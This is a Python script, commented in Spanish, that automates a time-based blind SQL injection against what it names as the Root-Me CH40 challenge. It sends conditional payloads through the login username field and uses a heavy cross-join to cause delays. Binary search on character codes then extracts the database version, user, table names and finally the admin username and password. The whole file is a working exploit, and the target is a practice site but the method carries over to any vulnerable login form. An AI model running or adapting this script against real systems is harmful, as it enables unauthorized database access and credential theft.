#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 30 - EXTRAER INFORMACIÓN REAL
Usando la técnica que SÍ funciona
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        # La mejor combinación de nuestros tests
        self.heavy = "(SELECT COUNT(*) FROM member, member T1)"
        self.technique = "1 AND IF({cond}, 0, {heavy})"  # AND IF invertido
        
    def test_payload_login(self, payload, repeats=5):
        tiempos = []
        data = {"username": payload, "password": "test"}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.post(URL + "?action=login", data=data, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition):
        payload = self.technique.format(cond=condition, heavy=self.heavy)
        t = self.test_payload_login(payload, repeats=2)
        return t > self.threshold
    
    def extract_char(self, query, pos):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
            if self.is_true(cond):
                low = mid + 1
            else:
                high = mid - 1
        return chr(low)
    
    def extract_string(self, query, label="Extrayendo", max_len=50):
        print(f"\n[*] {label}...")
        result = ""
        for pos in range(1, max_len + 1):
            char = self.extract_char(query, pos)
            result += char
            print(f"  [{pos}] '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:
                break
        return result

# EJECUCIÓN
injector = TimeBasedSQLInjector()

print("="*70)
print("  EXTRAYENDO INFORMACIÓN REAL")
print("="*70)

# 1. Extraer VERSION() real
print("\n[1] Extrayendo VERSION()...")
version = injector.extract_string("SELECT VERSION()", "Versión de MySQL")
print(f"\n  Versión: '{version}'")

# 2. Extraer DATABASE() real
print("\n[2] Extrayendo DATABASE()...")
db = injector.extract_string("SELECT DATABASE()", "Base de datos")
print(f"\n  Base de datos: '{db}'")

# 3. Extraer USER() real
print("\n[3] Extrayendo USER()...")
user = injector.extract_string("SELECT USER()", "Usuario")
print(f"\n  Usuario: '{user}'")

# 4. Extraer información del schema
print("\n[4] Extrayendo información del schema...")

# 4a. Contar tablas
print("\n  Contando tablas...")
count = injector.extract_string(
    "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE()",
    "Total tablas"
)
print(f"  Total tablas: '{count}'")

# 4b. Listar tablas
print("\n  Listando tablas:")
for i in range(1, 10):
    query = f"SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1 OFFSET {i-1}"
    tabla = injector.extract_string(query, f"Tabla {i}")
    if tabla:
        print(f"  Tabla {i}: '{tabla}'")
    else:
        break

# 5. Extraer usuarios de la tabla correcta
print("\n[5] Buscando usuarios...")

# Probar diferentes tablas
tablas = ['users', 'usuarios', 'member', 'members', 'admin', 'administradores', 'accounts', 'profile']

for tabla in tablas:
    print(f"\n  Probando tabla: {tabla}")
    
    # Verificar si existe
    if not injector.is_true(f"EXISTS(SELECT * FROM {tabla})"):
        print(f"    ❌ Tabla no existe")
        continue
    
    print(f"    ✅ Tabla existe")
    
    # Buscar columnas de usuario
    columnas = ['username', 'user', 'login', 'name', 'email']
    for col in columnas:
        if injector.is_true(f"EXISTS(SELECT {col} FROM {tabla})"):
            print(f"    ✅ Columna encontrada: {col}")
            
            # Verificar si contiene 'admin'
            if injector.is_true(f"EXISTS(SELECT {col} FROM {tabla} WHERE {col}='admin')"):
                print(f"      ✅ ¡'admin' encontrado en {tabla}.{col}!")
                
                # Extraer el admin
                query = f"SELECT {col} FROM {tabla} WHERE {col}='admin'"
                admin = injector.extract_string(query, f"Admin de {tabla}")
                print(f"      Admin: '{admin}'")
                
                # Buscar contraseña
                cols_pass = ['password', 'pass', 'pwd', 'clave']
                for cp in cols_pass:
                    if injector.is_true(f"EXISTS(SELECT {cp} FROM {tabla})"):
                        query_pass = f"SELECT {cp} FROM {tabla} WHERE {col}='admin'"
                        passwd = injector.extract_string(query_pass, f"Contraseña de admin")
                        print(f"      Contraseña: '{passwd}'")
                        break
                
                # Salir
                print("\n" + "="*70)
                print(f"  ✅ ¡ÉXITO! Tabla: {tabla}, Columna: {col}")
                print(f"  Admin: '{admin}'")
                print(f"  Password: '{passwd}'")
                print("="*70)
                exit(0)
